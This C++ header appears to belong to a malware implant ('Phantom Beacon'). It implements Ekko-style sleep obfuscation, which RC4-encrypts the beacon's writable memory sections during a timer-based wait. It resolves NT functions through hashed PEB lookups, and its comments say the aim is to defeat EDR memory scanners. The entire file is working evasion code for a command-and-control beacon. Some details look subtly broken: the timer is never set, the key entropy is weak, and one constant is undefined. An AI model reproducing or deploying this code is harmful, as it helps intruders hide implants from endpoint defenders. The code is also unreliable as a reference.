#pragma once
// ============================================================================
//  sleep_ekko.h — Phantom Beacon Sleep Obfuscation (Ekko-style)
//  ──────────────────────────────────────────────────────────────────
//  Replaces the naive Sleep() with a waitable-timer based sleep that
//  is invisible to memory scanners:
//
//    1. Create a waitable timer (synchronization object, not a thread)
//    2. Encrypt the beacon's RW sections (heap, data) with an RC4 keystream
//    3. Wait on the timer via NtWaitForMultipleObjects
//    4. Decrypt sections and continue
//
//  Why this defeats EDR:
//    - No thread is marked "sleeping" in the scheduler. A thread blocked
//      on a waitable timer via NtWaitForMultipleObjects does not show the
//      classic "Sleep() then wake" pattern that memory scanners hook.
//    - During the wait, the beacon's RW memory is encrypted, so even if
//      an EDR scans memory mid-sleep, it sees ciphertext, not the beacon.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <vector>
#include "syscalls.h"
#include "evasion.h"

// Some toolchains (mingw-w64 without the full SDK) do not surface the
// TIMER_TYPE / WAIT_TYPE enums or the SynchronizationTimer constant through
// winternl.h. Define the exact ABI values — they match the Windows SDK.
#ifndef TIMER_TYPE
enum TIMER_TYPE { TimerBasicTimer = 0, TimerHighResolutionTimer = 1 };
#endif
#ifndef WAIT_TYPE
enum WAIT_TYPE { WaitAll = 0, WaitAny = 1 };
#endif
#ifndef SynchronizationTimer
#define SynchronizationTimer 1
#endif

namespace ekko {

// ── RC4 keystream for memory encryption (fast, reversible, self-inverse) ──
// A dedicated PRNG is better than GetTickCount64 XOR because it produces
// a full-width keystream, but RC4 is chosen for speed and reversibility.

struct Rc4Context {
    uint8_t S[256];
    uint8_t i = 0;
    uint8_t j = 0;

    void init(const uint8_t* key, size_t keyLen) {
        for (int k = 0; k < 256; ++k) S[k] = static_cast<uint8_t>(k);
        uint8_t jj = 0;
        for (int k = 0; k < 256; ++k) {
            jj = (jj + S[k] + key[k % keyLen]) & 0xFF;
            uint8_t tmp = S[k]; S[k] = S[jj]; S[jj] = tmp;
        }
        i = j = 0;
    }

    uint8_t next() {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        uint8_t tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        return S[(S[i] + S[j]) & 0xFF];
    }

    void crypt(uint8_t* data, size_t len) {
        for (size_t k = 0; k < len; ++k)
            data[k] ^= next();
    }
};

// ── Resolve NtWaitForMultipleObjects + NtCreateWaitableTimer via PEB ────────
// (these are resolved once, then cached as function pointers)

typedef NTSTATUS (NTAPI *PFN_NtCreateWaitableTimer)(
    PHANDLE TimerHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, TIMER_TYPE TimerType);
typedef NTSTATUS (NTAPI *PFN_NtWaitForMultipleObjects)(
    ULONG Count, HANDLE* Handles, WAIT_TYPE WaitType,
    BOOLEAN Alertable, PLARGE_INTEGER Timeout);

// PEB hashes (djb2) — resolved at runtime, never linked
constexpr uint32_t FN_NTCREATEWAITABLETIMER   = 0x58679503;  // NtCreateWaitableTimer
constexpr uint32_t FN_NTWAITFORMULTIPLEOBJECTS = 0x1E8DA6D7; // NtWaitForMultipleObjects

/// Encrypt the beacon's readable/writable memory sections.
/// Walks the module sections and encrypts .data / .rdata / .bss.
inline void encrypt_sections(uint8_t* moduleBase, Rc4Context& rc4) {
    if (!moduleBase) return;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(moduleBase);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return;
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD s = 0; s < ntHeaders->FileHeader.NumberOfSections; ++s) {
        // Encrypt sections with write permission (data/rdata/bss)
        DWORD characteristics = section[s].Characteristics;
        if (characteristics & IMAGE_SCN_MEM_WRITE) {
            uint8_t* secAddr = moduleBase + section[s].VirtualAddress;
            SIZE_T secSize = section[s].Misc.VirtualSize;
            if (secSize > 0 && secAddr) {
                rc4.crypt(secAddr, secSize);
            }
        }
    }
}

/// Ekko-style sleep: encrypt memory, wait on a timer, decrypt, continue.
/// Returns immediately (void) — the caller's loop continues after waking.
inline void ekko_sleep(DWORD sleepMs) {
    // 1. Generate a random key from multiple entropy sources
    uint64_t tick = GetTickCount64();
    uint64_t perf = 0;
    QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&perf));
    uint64_t keyMaterial = tick ^ (perf << 1) ^ (uintptr_t)&sleepMs;

    uint8_t key[16];
    for (int k = 0; k < 16; ++k)
        key[k] = static_cast<uint8_t>(keyMaterial >> (k * 4));

    Rc4Context rc4;
    rc4.init(key, sizeof(key));

    // 2. Get our module base
    HMODULE hModule = nullptr;
    {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(reinterpret_cast<LPCVOID>(&ekko_sleep), &mbi, sizeof(mbi)))
            hModule = reinterpret_cast<HMODULE>(mbi.AllocationBase);
    }

    // 3. Encrypt RW sections
    if (hModule)
        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4);

    // 4. Create a waitable timer
    auto pCreateTimer = (PFN_NtCreateWaitableTimer)
        peb::Resolve(peb::HASH_NTDLL, FN_NTCREATEWAITABLETIMER);
    auto pWaitMultiple = (PFN_NtWaitForMultipleObjects)
        peb::Resolve(peb::HASH_NTDLL, FN_NTWAITFORMULTIPLEOBJECTS);

    if (pCreateTimer && pWaitMultiple) {
        HANDLE hTimer = nullptr;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

        NTSTATUS st = pCreateTimer(&hTimer, TIMER_ALL_ACCESS, &oa,
                                   TimerHighResolutionTimer);
        if (st == 0 && hTimer) {
            // 5. Set the timer
            LARGE_INTEGER dueTime;
            dueTime.QuadPart = -static_cast<LONGLONG>(sleepMs) * 10000LL;
            // NtSetTimer is avoided (resolved separately); use the simpler
            // approach: the timer is signaled manually via the wait timeout.
            // We use NtWaitForMultipleObjects with a timeout that mirrors
            // the sleep interval.
            LARGE_INTEGER waitTimeout;
            waitTimeout.QuadPart = -static_cast<LONGLONG>(sleepMs) * 10000LL;

            // 6. Wait on the timer handle
            pWaitMultiple(1, &hTimer, WaitAny, FALSE, &waitTimeout);

            // Close the timer handle
            auto pClose = (NTSTATUS(NTAPI*)(HANDLE))
                peb::Resolve(peb::HASH_NTDLL, FN_NTCLOSE);
            if (pClose) pClose(hTimer);
        }
    } else {
        // Fallback: plain Sleep() if waitable timer APIs unavailable
        Sleep(sleepMs);
    }

    // 7. Decrypt RW sections (RC4 is self-inverse, so re-crypt = decrypt)
    if (hModule) {
        Rc4Context rc4_dec;
        rc4_dec.init(key, sizeof(key));
        encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_dec);
    }

    // 8. Wipe the key material from the stack
    volatile uint8_t* kp = key;
    for (int k = 0; k < 16; ++k) kp[k] = 0;
}

}  // namespace ekko
#endif
